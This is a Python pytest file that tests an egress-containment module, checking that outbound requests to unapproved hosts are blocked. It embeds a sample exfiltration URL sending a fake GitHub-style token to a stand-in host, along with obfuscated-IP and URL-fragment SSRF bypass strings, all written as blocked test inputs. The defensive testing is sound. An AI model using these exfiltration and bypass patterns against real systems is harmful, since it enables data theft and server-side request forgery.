"""
Integration tests for Priority B GAP-03: Transitive Egress Enforcement.

Demonstrates real outbound transport policy enforcement against local synthetic HTTP receivers.
Verifies that:
1. Explicitly authorized outbound requests succeed.
2. Prohibited GET query parameter exfiltration attempts are blocked.
3. Redirects to prohibited destinations are blocked before request transmission.
4. Destination normalization bypasses are rejected.
5. DNS/IP validation blocks restricted ranges.
6. Alternate transport paths are blocked.
7. Missing/invalid egress policy fails closed.
8. Benign requests remain functional.
Asserts exact requests and bytes received by local synthetic servers.
"""

import pytest
import http.server
import socketserver
import threading
import socket
import time
import urllib.request
import urllib.parse

from epistemicos.containment import (
    EgressPolicy,
    EgressTransportBroker,
    ControlledEgressTransport,
    ActionCategory
)


class SyntheticHTTPServer:
    """Threaded local synthetic HTTP server for egress verification."""

    def __init__(self, handler_factory=None):
        self.requests_received = []
        self.bytes_received = 0
        self.lock = threading.Lock()
        self.server = None
        self.thread = None
        self.handler_factory = handler_factory or self.default_handler_factory

    def default_handler_factory(self, *args, **kwargs):
        server_self = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                server_self._record_req("GET", self.path, self.headers, None)
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"OK_GET")

            def do_POST(self):
                content_len = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(content_len) if content_len > 0 else b""
                server_self._record_req("POST", self.path, self.headers, body)

                # Check for redirect test header
                redir_target = self.headers.get("X-Test-Redirect")
                if redir_target:
                    self.send_response(302)
                    self.send_header("Location", redir_target)
                    self.end_headers()
                    return

                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"OK_POST")

            def log_message(self, format, *args):
                pass  # Suppress stdout logging

        return Handler(*args, **kwargs)

    def _record_req(self, method, path, headers, body):
        with self.lock:
            body_len = len(body) if body else 0
            self.bytes_received += body_len
            self.requests_received.append({
                "method": method,
                "path": path,
                "headers": dict(headers),
                "body": body
            })

    def start(self):
        self.server = socketserver.TCPServer(("127.0.0.1", 0), self.handler_factory)
        self.port = self.server.server_address[1]
        self.host = f"127.0.0.1:{self.port}"
        self.thread = threading.Thread(target=self.server.serve_forever)
        self.thread.daemon = True
        self.thread.start()

    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()


@pytest.fixture
def synthetic_server():
    srv = SyntheticHTTPServer()
    srv.start()
    yield srv
    srv.stop()


def test_explicitly_authorized_outbound_request(synthetic_server):
    """1. Explicitly authorized outbound request succeeds and is received by receiver."""
    policy = EgressPolicy(
        allowed_destinations={"127.0.0.1"},
        allowed_ports={synthetic_server.port},
        allow_loopback=True
    )
    transport = ControlledEgressTransport(policy=policy)

    res = transport.request("GET", f"http://127.0.0.1:{synthetic_server.port}/api/health")
    assert res["status"] == 200
    assert res["body"] == b"OK_GET"
    assert len(synthetic_server.requests_received) == 1
    assert synthetic_server.requests_received[0]["path"] == "/api/health"


def test_prohibited_get_parameter_exfiltration_blocked(synthetic_server):
    """2. Prohibited GET query parameter exfiltration to unapproved domain is blocked before transmission."""
    policy = EgressPolicy(
        allowed_destinations={"authorized-service.com"},
        allowed_ports={80, 443}
    )
    transport = ControlledEgressTransport(policy=policy)

    unapproved_url = "http://exfil-sink.com/callback?secret=ghp_1234567890abcdef1234567890abcdef"

    with pytest.raises(PermissionError, match="Egress transport blocked"):
        transport.request("GET", unapproved_url)

    # Verify 0 requests and 0 bytes reached synthetic server
    assert len(synthetic_server.requests_received) == 0
    assert synthetic_server.bytes_received == 0


def test_redirect_to_prohibited_destination_blocked(synthetic_server):
    """3. Redirect chain leading to prohibited destination is blocked before second hop."""
    # Secondary prohibited server
    prohibited_server = SyntheticHTTPServer()
    prohibited_server.start()

    try:
        policy = EgressPolicy(
            allowed_destinations={"127.0.0.1"},
            allowed_ports={synthetic_server.port},  # Prohibited server's port NOT allowed
            allow_loopback=True
        )
        transport = ControlledEgressTransport(policy=policy)

        # First hop is allowed, but returns 302 to prohibited_server
        def redir_handler(url):
            if f":{synthetic_server.port}" in url:
                return {
                    "status": 302,
                    "headers": {"Location": f"http://127.0.0.1:{prohibited_server.port}/stolen"}
                }
            return {"status": 200, "headers": {}, "body": b""}

        with pytest.raises(PermissionError, match="Egress transport blocked redirect"):
            transport.request(
                "GET",
                f"http://127.0.0.1:{synthetic_server.port}/initial",
                redirect_handler=redir_handler
            )

        # Prohibited server must have received 0 requests
        assert len(prohibited_server.requests_received) == 0
        assert prohibited_server.bytes_received == 0
    finally:
        prohibited_server.stop()


def test_destination_normalization_bypass_blocked(synthetic_server):
    """4. Destination normalization bypass attempts (userinfo, hex IPs, fragments) are blocked."""
    policy = EgressPolicy(
        allowed_destinations={"api.github.com"},
        allow_loopback=False
    )
    broker = EgressTransportBroker(policy=policy)

    bypasses = [
        "http://user:pass@127.0.0.1/path",
        "http://0x7f.0.0.1/path",
        "http://127.0.0.1#@api.github.com",
        "http://017700000001/path",
        "http://2130706433/path"
    ]

    for target in bypasses:
        allowed, reason, _ = broker.establish_connection(target)
        assert allowed is False, f"Bypass succeeded for {target}!"
        assert "Egress blocked" in reason


def test_dns_ip_validation_and_loopback_restriction():
    """5. DNS/IP validation blocks private/loopback IPs when allow_loopback=False."""
    policy = EgressPolicy(
        allowed_destinations={"localhost", "127.0.0.1"},
        allow_loopback=False
    )
    broker = EgressTransportBroker(policy=policy)

    allowed, reason, _ = broker.establish_connection("http://127.0.0.1/test")
    assert allowed is False
    assert "restricted IP" in reason or "not in approved egress policy" in reason


def test_alternate_transport_path_socket_patching(synthetic_server):
    """6. Direct raw socket connect inside enforce_socket_boundary is blocked if destination unapproved."""
    policy = EgressPolicy(
        allowed_destinations={"allowed-domain.org"},
        allow_loopback=True
    )
    broker = EgressTransportBroker(policy=policy)

    with broker.enforce_socket_boundary():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        with pytest.raises(socket.error, match="Egress blocked"):
            s.connect(("127.0.0.1", synthetic_server.port))
        s.close()

    assert len(synthetic_server.requests_received) == 0


def test_missing_or_empty_egress_policy_fails_closed():
    """7. Missing or empty policy fails closed."""
    empty_policy = EgressPolicy(allowed_destinations=set())
    broker = EgressTransportBroker(policy=empty_policy)

    allowed, reason, _ = broker.establish_connection("http://api.github.com/events")
    assert allowed is False
    assert "Absent or empty approved-egress policy" in reason


def test_benign_request_remains_functional(synthetic_server):
    """8. Benign authorized request remains completely functional and accurate."""
    policy = EgressPolicy(
        allowed_destinations={"127.0.0.1"},
        allowed_ports={synthetic_server.port},
        allow_loopback=True
    )
    transport = ControlledEgressTransport(policy=policy)

    res = transport.request("POST", f"http://127.0.0.1:{synthetic_server.port}/submit", body="valid_payload_data")
    assert res["status"] == 200
    assert res["body"] == b"OK_POST"

    assert len(synthetic_server.requests_received) == 1
    req = synthetic_server.requests_received[0]
    assert req["method"] == "POST"
    assert req["path"] == "/submit"
    assert req["body"] == b"valid_payload_data"
    assert synthetic_server.bytes_received == len(b"valid_payload_data")
